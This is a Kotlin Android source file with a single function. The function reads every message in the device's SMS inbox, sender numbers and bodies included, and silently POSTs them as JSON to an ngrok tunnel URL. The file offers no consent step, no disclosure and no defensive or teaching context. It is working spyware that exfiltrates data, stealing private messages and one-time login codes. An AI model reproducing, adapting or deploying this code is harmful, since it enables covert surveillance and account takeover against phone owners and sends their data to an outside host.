package com.example.myapplication

import android.content.Context
import android.database.Cursor
import android.net.Uri
import android.util.Log
import okhttp3.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody

fun readSmsAndSend(context: Context) {

    val uri = Uri.parse("content://sms/inbox")
    val cursor: Cursor? = context.contentResolver.query(uri, null, null, null, null)

    val smsArray = JSONArray()

    cursor?.use {
        while (it.moveToNext()) {

            val address = it.getString(it.getColumnIndexOrThrow("address"))
            val body = it.getString(it.getColumnIndexOrThrow("body"))

            val smsObject = JSONObject()
            smsObject.put("number", address)
            smsObject.put("message", body)

            smsArray.put(smsObject)
        }
    }

    // 🔥 SERVER SEND
    val client = OkHttpClient()

    val json = JSONObject()
    json.put("sms", smsArray)

    val requestBody = json.toString().toRequestBody(
        "application/json".toMediaType()
    )

    val request = Request.Builder()
        .url("https://hanna-untransgressed-chieko.ngrok-free.dev/sms")
        .post(requestBody)
        .build()

    client.newCall(request).enqueue(object : Callback {

        override fun onFailure(call: Call, e: IOException) {
            Log.e("SMS_ERROR", e.message.toString())
        }

        override fun onResponse(call: Call, response: Response) {
            Log.d("SMS_SUCCESS", "SMS sent to server")
        }
    })
}